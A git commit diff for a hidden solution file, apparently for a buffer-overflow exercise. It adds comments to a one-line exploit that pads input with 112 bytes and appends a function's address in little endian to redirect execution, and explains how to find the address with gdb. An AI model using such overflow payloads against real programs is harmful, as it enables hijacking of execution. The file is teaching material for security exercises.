05f65786c1009cf7b831e1628db190c7ec63e2eb
SnpM <peter@C24JPAN.usafa.ds.af.edu>
2022-04-29 08:14:57 -0600

    Add clarity to solution

--- .solution.py
+++ .solution.py
@@ -1,2 +1,6 @@
-# 0x08049d55
-print("A"*112 + "\x08\x04\x9d\x55"[::-1])
+# Enter address of gettreasure in little endian (what GDB displays by default on x86)
+# You can find this with the following commands:
+#   gdb treasure
+#   info address gettreasure
+address = "\x08\x04\x9d\x55"
+print("A"*112 + address[::-1])
